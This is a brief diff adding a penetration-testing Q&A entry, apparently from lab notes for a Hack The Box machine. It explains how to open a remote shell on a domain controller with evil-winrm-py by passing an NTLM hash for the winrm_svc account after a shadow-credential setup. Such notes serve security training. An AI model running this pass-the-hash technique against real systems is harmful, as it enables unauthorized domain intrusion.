@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+How do you obtain a shell access using the shadow credential?
+
+CONTEXT:
+You have completed the shadow credential setup.
+
+METHOD / ANSWER:
+Command: `evil-winrm-py -i dc01.fluffy.htb -u winrm_svc -H <NTLM_hash>`
+Explanation: Use Evil-WinRM to authenticate and start a shell session using the NTLM hash with the winrm_svc account.
